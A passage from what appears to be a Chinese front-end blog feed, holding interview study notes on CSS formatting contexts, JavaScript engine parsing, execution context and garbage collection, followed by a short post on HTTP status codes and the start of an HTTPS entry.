hidden</code>则会产生一个不可见的框</li></ul><p>总结：</p><ul><li>如果一个框里，有一个块级元素，那么这个框里的内容都会被当作块框来进行格式化，因为只要出现了块级元素，就会将里面的内容分块几块，每一块独占一行（出现行内可以用匿名块框解决）</li><li>如果一个框里，没有任何块级元素，那么这个框里的内容会被当成行内框来格式化，因为里面的内容是按照顺序成行的排列<br><a name="section-14-3"></a></li></ul><h3 id="BFC（Block-Formatting-Context）"><a href="#BFC（Block-Formatting-Context）" class="headerlink" title="BFC（Block Formatting Context）"></a>BFC（Block Formatting Context）</h3><p>FC（格式上下文）？<br />FC即格式上下文，它定义框内部的元素渲染规则，比较抽象，譬如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FC像是一个大箱子，里面装有很多元素</span><br><span class="line">箱子可以隔开里面的元素和外面的元素（所以外部并不会影响FC内部的渲染）</span><br><span class="line">内部的规则可以是：如何定位，宽高计算，margin折叠等等</span><br></pre></td></tr></table></figure><p>不同类型的框参与的FC类型不同，譬如块级框对应BFC，行内框对应IFC<br /><strong>注意，并不是说所有的框都会产生FC，而是符合特定条件才会产生，只有产生了对应的FC后才会应用对应渲染规则</strong><br /><strong>BFC规则：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在块格式化上下文中</span><br><span class="line">每一个元素左外边与包含块的左边相接触（对于从右到左的格式化，右外边接触右边）</span><br><span class="line">即使存在浮动也是如此（所以浮动元素正常会直接贴近它的包含块的左边，与普通元素重合）</span><br><span class="line">除非这个元素也创建了一个新的BFC</span><br></pre></td></tr></table></figure><p>总结几点BFC特点：</p><ol><li>内部<code>box</code>在垂直方向，一个接一个的放置</li><li>box的垂直方向由<code>margin</code>决定，属于同一个BFC的两个box间的margin会重叠</li><li>BFC区域不会与<code>float box</code>重叠（可用于排版)</li><li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此</li><li>计算BFC的高度时，浮动元素也参与计算（不会浮动坍塌）</li></ol><p>如何触发BFC？</p><ol><li>根元素</li><li><code>float</code>属性不为<code>none</code></li><li><code>position</code>为<code>absolute</code>或<code>fixed</code></li><li><code>display</code>为<code>inline-block</code>, <code>flex</code>, <code>inline-flex</code>，<code>table</code>，<code>table-cell</code>，<code>table-caption</code></li><li><code>overflow</code>不为<code>visible</code></li></ol><p>这里提下，<code>display: table</code>，它本身不产生BFC，但是它会产生匿名框（包含<code>display: table-cell</code>的框），而这个匿名框产生BFC<br />更多请自行网上搜索<br><a name="section-14-4"></a></p><h3 id="IFC（Inline-Formatting-Context）"><a href="#IFC（Inline-Formatting-Context）" class="headerlink" title="IFC（Inline Formatting Context）"></a>IFC（Inline Formatting Context）</h3><p>IFC即行内框产生的格式上下文<br /><strong>IFC规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在行内格式化上下文中</span><br><span class="line">框一个接一个地水平排列，起点是包含块的顶部。</span><br><span class="line">水平方向上的 margin，border 和 padding 在框之间得到保留</span><br><span class="line">框在垂直方向上可以以不同的方式对齐：它们的顶部或底部对齐，或根据其中文字的基线对齐</span><br></pre></td></tr></table></figure><p><strong>行框</strong><br /><strong>包含那些框的长方形区域，会形成一行，叫做行框</strong><br />行框的宽度由它的包含块和其中的浮动元素决定，高度的确定由行高度计算规则决定<br />行框的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果几个行内框在水平方向无法放入一个行框内，它们可以分配在两个或多个垂直堆叠的行框中（即行内框的分割）</span><br><span class="line">行框在堆叠时没有垂直方向上的分割且永不重叠</span><br><span class="line">行框的高度总是足够容纳所包含的所有框。不过，它可能高于它包含的最高的框（例如，框对齐会引起基线对齐）</span><br><span class="line">行框的左边接触到其包含块的左边，右边接触到其包含块的右边。</span><br></pre></td></tr></table></figure><p><strong>结合补充下IFC规则：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">浮动元素可能会处于包含块边缘和行框边缘之间</span><br><span class="line">尽管在相同的行内格式化上下文中的行框通常拥有相同的宽度（包含块的宽度），它们可能会因浮动元素缩短了可用宽度，而在宽度上发生变化</span><br><span class="line">同一行内格式化上下文中的行框通常高度不一样（如，一行包含了一个高的图形，而其它行只包含文本）</span><br><span class="line">当一行中行内框宽度的总和小于包含它们的行框的宽，它们在水平方向上的对齐，取决于 `text-align` 特性</span><br><span class="line">空的行内框应该被忽略</span><br><span class="line">即不包含文本，保留空白符，margin/padding/border非0的行内元素，</span><br><span class="line">以及其他常规流中的内容(比如，图片，inline blocks 和 inline tables)，</span><br><span class="line">并且不是以换行结束的行框，</span><br><span class="line">必须被当作零高度行框对待</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>行内元素总是会应用IFC渲染规则</li><li>行内元素会应用IFC规则渲染，譬如<code>text-align</code>可以用来居中等</li><li>块框内部，对于文本这类的匿名元素，会产生匿名行框包围，而行框内部就应用IFC渲染规则</li><li>行内框内部，对于那些行内元素，一样应用IFC渲染规则</li><li>另外，<code>inline-block</code>，会在元素外层产生IFC（所以这个元素是可以通过<code>text-align</code>水平居中的），当然，它内部则按照BFC规则渲染</li></ul><p>相比BFC规则来说，IFC可能更加抽象（因为没有那么条理清晰的规则和触发条件）<br />但总的来说，它就是行内元素自身如何显示以及在框内如何摆放的渲染规则，这样描述应该更容易理解<br><a name="section-14-5"></a></p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>当然还有有一些其它内容：</p><ul><li>譬如常规流，浮动，绝对定位等区别</li><li>譬如浮动元素不包含在常规流中</li><li>譬如相对定位，绝对定位，<code>Fixed</code>定位等区别</li><li>譬如<code>z-index</code>的分层显示机制等</li></ul><p>这里不一一展开，更多请参考：<br /><a href="http://bbs.csdn.net/topics/340204423">http://bbs.csdn.net/topics/340204423</a><br><a name="section-15"></a></p><h2 id="JS引擎解析过程"><a href="#JS引擎解析过程" class="headerlink" title="JS引擎解析过程"></a>JS引擎解析过程</h2><p>前面有提到遇到JS脚本时，会等到它的执行，实际上是需要引擎解析的，这里展开描述（介绍主干流程）<br><a name="section-15-1"></a></p><h3 id="JS的解释阶段"><a href="#JS的解释阶段" class="headerlink" title="JS的解释阶段"></a>JS的解释阶段</h3><p>首先得明确： <strong>JS是解释型语音，所以它无需提前编译，而是由解释器实时运行</strong><br />引擎对JS的处理过程可以简述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 读取代码，进行词法分析（Lexical analysis），然后将代码分解成词元（token）</span><br><span class="line">2. 对词元进行语法分析（parsing），然后将代码整理成语法树（syntax tree）</span><br><span class="line">3. 使用翻译器（translator），将代码转为字节码（bytecode）</span><br><span class="line">4. 使用字节码解释器（bytecode interpreter），将字节码转为机器码</span><br></pre></td></tr></table></figure><p>最终计算机执行的就是机器码。<br />为了提高运行速度，现代浏览器一般采用即时编译（<code>JIT-Just In Time compiler</code>）<br />即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（<code>inline cache</code>）<br />这样整个程序的运行速度能得到显著提升。<br />而且，不同浏览器策略可能还不同，有的浏览器就省略了字节码的翻译步骤，直接转为机器码（如chrome的v8）<br />总结起来可以认为是： <strong>核心的</strong><code>**JIT**</code><strong>编译器将源码编译成机器码运行</strong><br><a name="section-15-2"></a></p><h3 id="JS的预处理阶段"><a href="#JS的预处理阶段" class="headerlink" title="JS的预处理阶段"></a>JS的预处理阶段</h3><p>上述将的是解释器的整体过程，这里再提下在正式执行JS前，还会有一个预处理阶段 （譬如变量提升，分号补全等）<br />预处理阶段会做一些事情，确保JS可以正确执行，这里仅提部分：<br /><strong>分号补全</strong><br />JS执行是需要分号的，但为什么以下语句却可以正常运行呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#x27;a&#x27;)</span><br><span class="line">console.log(&#x27;b&#x27;)</span><br></pre></td></tr></table></figure><p>原因就是JS解释器有一个<a href="http://inimino.org/~inimino/blog/javascript_semicolons">Semicolon Insertion</a>规则，它会按照一定规则，在适当的位置补充分号<br />譬如列举几条自动加分号的规则：</p><ul><li>当有换行符（包括含有换行符的多行注释），并且下一个<code>token</code>没法跟前面的语法匹配时，会自动补分号。</li><li>当有<code>&#125;</code>时，如果缺少分号，会补分号。</li><li>程序源代码结束时，如果缺少分号，会补分号。</li></ul><p>于是，上述的代码就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#x27;a&#x27;);</span><br><span class="line">console.log(&#x27;b&#x27;);</span><br></pre></td></tr></table></figure><p>所以可以正常运行<br />当然了，这里有一个经典的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    return</span><br><span class="line">    &#123;</span><br><span class="line">        a: &#x27;a&#x27;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于分号补全机制，所以它变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    return;</span><br><span class="line">    &#123;</span><br><span class="line">        a: &#x27;a&#x27;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以运行后是<code>undefined</code><br /><strong>变量提升</strong><br />一般包括函数提升和变量提升<br />譬如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = 1;</span><br><span class="line">b();</span><br><span class="line">function b() &#123;</span><br><span class="line">    console.log(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">var a;</span><br></pre></td></tr></table></figure><p>经过变量提升后，就变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    console.log(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">var a;</span><br><span class="line">a = 1;</span><br><span class="line">b();</span><br></pre></td></tr></table></figure><p>这里没有展开，其实展开也可以牵涉到很多内容的<br />譬如可以提下变量声明，函数声明，形参，实参的优先级顺序，以及es6中let有关的临时死区等<br><a name="section-15-3"></a></p><h3 id="JS的执行阶段"><a href="#JS的执行阶段" class="headerlink" title="JS的执行阶段"></a>JS的执行阶段</h3><p>此阶段的内容中的图片来源：<a href="http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html">深入理解JavaScript系列（10）：JavaScript核心（晋级高手必读篇）</a><br />解释器解释完语法规则后，就开始执行，然后整个执行流程中大致包含以下概念：</p><ul><li>执行上下文，执行堆栈概念（如全局上下文，当前活动上下文）</li><li>VO（变量对象）和AO（活动对象）</li><li>作用域链</li><li>this机制等</li></ul><p>这些概念如果深入讲解的话内容过多，因此这里仅提及部分特性<br /><strong>执行上下文简单解释</strong></p><ul><li>JS有<code>执行上下文</code>）</li><li>浏览器首次载入脚本，它将创建<code>全局执行上下文</code>，并压入执行栈栈顶（不可被弹出）</li><li>然后每进入其它作用域就创建对应的执行上下文并把它压入执行栈的顶部</li><li>一旦对应的上下文执行完毕，就从栈顶弹出，并将上下文控制权交给当前的栈。</li><li>这样依次执行（最终都会回到全局执行上下文）</li></ul><p>譬如，如果程序执行完毕，被弹出执行栈，然后有没有被引用（没有形成闭包），那么这个函数中用到的内存就会被垃圾处理器自动回收</p><p>然后执行上下文与VO，作用域链，this的关系是：<br />每一个执行上下文，都有三个重要属性：</p><ul><li>变量对象(<code>Variable object，VO</code>)</li><li>作用域链(<code>Scope chain</code>)</li><li><code>this</code></li></ul><p><strong>VO与AO</strong><br />VO是执行上下文的属性（抽象概念），但是<strong>只有全局上下文的变量对象允许通过VO的属性名称来间接访问（因为在全局上下文里，全局对象自身就是变量对象）</strong><br />AO（<code>activation object</code>)，当函数被调用者激活，AO就被创建了<br />可以理解为：</p><ul><li>在函数上下文中：<code>VO === AO</code></li><li>在全局上下文中：<code>VO === this === global</code></li></ul><p>总的来说，VO中会存放一些变量信息（如声明的变量，函数，<code>arguments</code>参数等等）<br /><strong>作用域链</strong><br />它是执行上下文中的一个属性，原理和原型链很相似，作用很重要。<br />譬如流程简述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在函数上下文中，查找一个变量foo</span><br><span class="line">如果函数的VO中找到了，就直接使用</span><br><span class="line">否则去它的父级作用域链中（__parent__）找</span><br><span class="line">如果父级中没找到，继续往上找</span><br><span class="line">直到全局上下文中也没找到就报错</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829648-61214bf4-f712-43b1-92ac-4a73ebee5594.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829648-61214bf4-f712-43b1-92ac-4a73ebee5594.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>this指针</strong><br />这也是JS的核心知识之一，由于内容过多，这里就不展开，仅提及部分<br />注意：<strong>this是执行上下文环境的一个属性，而不是某个变量对象的属性</strong><br />因此:</p><ul><li>this是没有一个类似搜寻变量的过程</li><li>当代码中使用了this，这个 this的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻</li><li>this的值只取决中进入上下文时的情况</li></ul><p>所以经典的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var baz = 200;</span><br><span class="line">var bar = &#123;</span><br><span class="line">    baz: 100,</span><br><span class="line">    foo: function() &#123;</span><br><span class="line">        console.log(this.baz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var foo = bar.foo;</span><br><span class="line">// 进入环境：global</span><br><span class="line">foo(); // 200，严格模式中会报错，Cannot read property &#x27;baz&#x27; of undefined</span><br><span class="line">// 进入环境：global bar</span><br><span class="line">bar.foo(); // 100</span><br></pre></td></tr></table></figure><p>就要明白了上面this的介绍，上述例子很好理解<br />更多参考：<br /><a href="http://www.cnblogs.com/TomXu/archive/2012/01/17/2310479.html">深入理解JavaScript系列（13）：This? Yes,this!</a><br><a name="section-15-4"></a></p><h3 id="回收机制"><a href="#回收机制" class="headerlink" title="回收机制"></a>回收机制</h3><p>JS有垃圾处理器，所以无需手动回收内存，而是由垃圾处理器自动处理。<br />一般来说，垃圾处理器有自己的回收策略。<br />譬如对于那些执行完毕的函数，如果没有外部引用（被引用的话会形成闭包），则会回收。（当然一般会把回收动作切割到不同的时间段执行，防止影响性能）<br />常用的两种垃圾回收规则是：</p><ul><li>标记清除</li><li>引用计数</li></ul><p>Javascript引擎基础GC方案是（<code>simple GC</code>）：<code>mark and sweep</code>（标记清除），简单解释如下：</p><ol><li>遍历所有可访问的对象。</li><li>回收已不可访问的对象。</li></ol><p>譬如：（出自javascript高程）</p><blockquote><p>当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。<br>从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。<br>而当变量离开环境时，则将其标记为“离开环境”。<br>垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。<br>然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包，也就是说在环境中的以及相关引用的变量会被去除标记）。<br>而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。<br>最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。</p></blockquote><p>关于引用计数，简单点理解：<br /><strong>跟踪记录每个值被引用的次数，当一个值被引用时，次数</strong><code>**+1**</code><strong>，减持时</strong><code>**-1**</code><strong>，下次垃圾回收器会回收次数为</strong><code>**0**</code><strong>的值的内存（当然了，容易出循环引用的bug）</strong><br /><strong>GC的缺陷</strong><br />和其他语言一样，javascript的GC策略也无法避免一个问题： <strong>GC时，停止响应其他操作</strong><br />这是为了安全考虑。<br />而Javascript的GC在<code>100ms</code>甚至以上<br />对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。<br />这就是引擎需要优化的点： <strong>避免GC造成的长时间停止响应。</strong><br /><strong>GC优化策略</strong><br />这里介绍常用到的：<strong>分代回收（Generation GC）</strong><br />目的是通过区分“临时”与“持久”对象:</p><ul><li>多回收“临时对象”区（<code>young generation</code>）</li><li>少回收“持久对象”区（<code>tenured generation</code>）</li><li>减少每次需遍历的对象，从而减少每次GC的耗时。</li></ul><p>像node v8引擎就是采用的分代回收（和java一样，作者是java虚拟机作者。）<br />更多可以参考：<br /><a href="https://zhuanlan.zhihu.com/p/33816534">V8 内存浅析</a><br><a name="section-16"></a></p><h2 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h2><p><a name="section-16-1"></a></p><h3 id="可以提到跨域"><a href="#可以提到跨域" class="headerlink" title="可以提到跨域"></a>可以提到跨域</h3><p>譬如发出网络请求时，会用AJAX，如果接口跨域，就会遇到跨域问题<br />可以参考：<br /><a href="https://segmentfault.com/a/1190000012469713">ajax跨域，这应该是最全的解决方案了</a><br><a name="section-16-2"></a></p><h3 id="可以提到web安全"><a href="#可以提到web安全" class="headerlink" title="可以提到web安全"></a>可以提到web安全</h3><p>譬如浏览器在解析HTML时，有<code>XSSAuditor</code>，可以延伸到web安全相关领域<br />可以参考：<br /><a href="https://segmentfault.com/a/1190000012693772">AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。</a><br><a name="section-16-3"></a></p><h3 id="更多-1"><a href="#更多-1" class="headerlink" title="更多"></a>更多</h3><p>如可以提到<code>viewport</code>概念，讲讲物理像素，逻辑像素，CSS像素等概念<br />如熟悉Hybrid开发的话可以提及一下Hybrid相关内容以及优化<br />…<br><a name="section-17"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述这么多内容，目的是：<strong>梳理出自己的知识体系</strong><br />本文由于是前端向，所以知识梳理时有重点，很多其它的知识点都简述或略去了，重点介绍的模块总结：</p><ul><li>浏览器的进程&#x2F;线程模型、JS运行机制（这一块的详细介绍链接到了另一篇文章）</li><li>http规范（包括报文结构，头部，优化，http2.0，https等）</li><li>http缓存（单独列出来，因为它很重要）</li><li>页面解析流程（HTML解析，构建DOM，生成CSS规则，构建渲染树，渲染流程，复合层的合成，外链的处理等）</li><li>JS引擎解析过程（包括解释阶段，预处理阶段，执行阶段，包括执行上下文、VO、作用域链、this、回收机制等）</li><li>跨域相关，web安全单独链接到了具体文章，其它如CSS盒模型，viewport等仅是提及概念</li></ul><p>关于本文的价值？<br /><strong>本文是个人阶段性梳理知识体系的成果</strong>，然后加以修缮后发布成文章，因此并不确保适用于所有人员<br />但是，个人认为本文还是有一定参考价值的<br><a name="section-18"></a></p><h2 id="写在最后的话"><a href="#写在最后的话" class="headerlink" title="写在最后的话"></a>写在最后的话</h2><p>还是那句话：<strong>知识要形成体系</strong><br />梳理出知识体系后，有了一个骨架，知识点不易遗忘，而且学习新知识时也会更加迅速，更重要的是容易举一反三，可以由一个普通的问题，深挖拓展到底层原理<br />前端知识是无穷无尽的，本文也仅仅是简单梳理出一个承载知识体系的骨架而已，更多的内容仍然需要不断学习，积累<br />另外，本文结合<a href="https://segmentfault.com/a/1190000012925872">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a>这篇文章，更佳噢！<br><a name="section-19"></a></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a name="section-19-1"></a></p><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>初次发布<code>2018.03.12</code>于我个人博客上面<br /><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html">http://www.dailichun.com/2018/03/12/whenyouenteraurl.html</a><br><a name="section-19-2"></a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://segmentfault.com/a/1190000012925872">https://segmentfault.com/a/1190000012925872</a></li><li><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/</a></li><li><a href="https://coolshell.cn/articles/9666.html">https://coolshell.cn/articles/9666.html</a></li><li><a href="http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/">http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/</a></li><li><a href="http://blog.csdn.net/dojiangv/article/details/51794535">http://blog.csdn.net/dojiangv/article/details/51794535</a></li><li><a href="http://bbs.csdn.net/topics/340204423">http://bbs.csdn.net/topics/340204423</a></li><li><a href="https://segmentfault.com/a/1190000004246731">https://segmentfault.com/a/1190000004246731</a></li><li><a href="http://www.bubuko.com/infodetail-1379568.html">http://www.bubuko.com/infodetail-1379568.html</a></li><li><a href="http://fex.baidu.com/blog/2014/05/what-happen/">http://fex.baidu.com/blog/2014/05/what-happen/</a></li><li><a href="http://www.cnblogs.com/winter-cn/archive/2013/05/21/3091127.html">http://www.cnblogs.com/winter-cn/archive/2013/05/21/3091127.html</a></li><li><a href="https://fanerge.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-webkit%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6.html">https://fanerge.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-webkit%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6.html</a></li><li><a href="http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html">http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html</a></li><li><a href="https://segmentfault.com/q/1010000000489803">https://segmentfault.com/q/1010000000489803</a></li></ul><blockquote><p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请求中常见的状态码</title>
      <link href="/2019/10/24/frontend/browser/qing-qiu-zhong-chang-jian-de-zhuang-tai-ma/"/>
      <url>/2019/10/24/frontend/browser/qing-qiu-zhong-chang-jian-de-zhuang-tai-ma/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><a name="vXcr4"></a>### 状态码是什么？客户端HTTP请求的返回标志，由3个十进制数字组成。<br />第一个数字：状态码的分类<br />后面两个数字：不同分类情况下的不同状态<a name="iFNoU"></a>### 最常见报错的状态码有哪些？<ol><li>304：有缓存， 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</li><li>400：请求内容有误，服务器不理解请求的语法。一般请求的内容写错或者格式不正确可能会出现这种错误</li><li>404：服务器上无法找到请求的资源，除此之外，也可以在服务器拒绝请求但不想给拒绝原因时使用；</li><li>405：请求的方法不正确，例如定义的是post方式，请求写的是get 就会报这种错</li><li>500：服务器内部错误，服务器遇到错误，无法完成请求。</li><li>502：错误网关，我一般遇见这个会出现在ngnix没有启动或者代理写错的时候<br><a name="zriL2"></a></li></ol><h3 id="总体概括"><a href="#总体概括" class="headerlink" title="总体概括"></a>总体概括</h3><p><a name="p4ZiA"></a></p><h4 id="1xx-：临时响应，需要请求者继续执行操作的状态代码"><a href="#1xx-：临时响应，需要请求者继续执行操作的状态代码" class="headerlink" title="1xx ：临时响应，需要请求者继续执行操作的状态代码"></a>1xx ：临时响应，需要请求者继续执行操作的状态代码</h4><table><thead><tr><th>100</th><th>表示服务器已经收到一部分请求正在等待剩余不符</th></tr></thead><tbody><tr><td>101</td><td>切换协议 要求服务器切换协议，并且服务器已确认并准备切换</td></tr></tbody></table><p><a name="KHEnD"></a></p><h4 id="2xx-：成功，请求已经成功"><a href="#2xx-：成功，请求已经成功" class="headerlink" title="2xx ：成功，请求已经成功"></a>2xx ：成功，请求已经成功</h4><table><thead><tr><th>200</th><th>请求成功</th></tr></thead><tbody><tr><td>201</td><td>已创建 请求成功并且服务器创建了新的资源</td></tr><tr><td>202</td><td>已接收 服务器已接收请求，但尚未处理</td></tr><tr><td>203</td><td>非授权信息 服务器已经成功处理了请求，但返回的信息来自于另外源</td></tr><tr><td>204</td><td>没有任何返回内容的成功请求，不更新文档视图</td></tr><tr><td>205</td><td>没有任何返回内容的成功请求，必须重置文档视图</td></tr><tr><td>206</td><td>成功处理了部分GET请求</td></tr></tbody></table><p><a name="mbJ3o"></a></p><h4 id="3xx-：重定向"><a href="#3xx-：重定向" class="headerlink" title="3xx ：重定向"></a>3xx ：重定向</h4><table><thead><tr><th>300</th><th>可选择的重定向资源</th></tr></thead><tbody><tr><td>301</td><td>请求资源已永久移动到新位置</td></tr><tr><td>302</td><td>请求的资源现在从不同的URL响应请求</td></tr><tr><td>303</td><td>当前请求的响应可以在另一个URL上找到</td></tr><tr><td>304</td><td>本次请求的内容和之前的一样没有变化</td></tr></tbody></table><p><a name="bV6Y1"></a></p><h4 id="4xx-：客户端响应"><a href="#4xx-：客户端响应" class="headerlink" title="4xx ：客户端响应"></a>4xx ：客户端响应</h4><table><thead><tr><th>400</th><th>语义有误，当前请求无法被服务器理解。请求参数有误</th></tr></thead><tbody><tr><td>401</td><td>当前请求需要用户验证</td></tr><tr><td>403</td><td>服务器拒绝的请求</td></tr><tr><td>404</td><td>请求资源没有在服务器上找到，请求失败</td></tr><tr><td>405</td><td>请求的方法不正确</td></tr></tbody></table><p><a name="AU3Jh"></a></p><h4 id="5xx-：服务器端响应"><a href="#5xx-：服务器端响应" class="headerlink" title="5xx ：服务器端响应"></a>5xx ：服务器端响应</h4><table><thead><tr><th>500</th><th>服务器不知道如何处理</th></tr></thead><tbody><tr><td>501</td><td>请求方法不被服务器支持</td></tr><tr><td>502</td><td>服务器的忘光得到一个错误的响应</td></tr><tr><td>503</td><td>服务器没有准备好处理请求，服务器在维护或者重载或者停机了</td></tr><tr><td>504</td><td>网关请求超时</td></tr><tr><td>505</td><td>服务器不支持请求中所使用的HTTP协议版本</td></tr></tbody></table><p>每种状态码下的分类只写到了5或者6，没有再往多的写，对于我们日常的使用足够了，如果有不在上面的分类的请到以下参考地址<br /><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status#%E6%88%90%E5%8A%9F%E5%93%8D%E5%BA%94">HTTP参考地址请点击</a></p><p><strong>I suppose some things are worth the wait.</strong><br /><strong>生命中有些事值得等待。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 状态码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Https</title>
      <link href="/2019/08/15/frontend/browser/https/"/>
      <url>/2019/08/15/frontend/browser/https/</url>
      
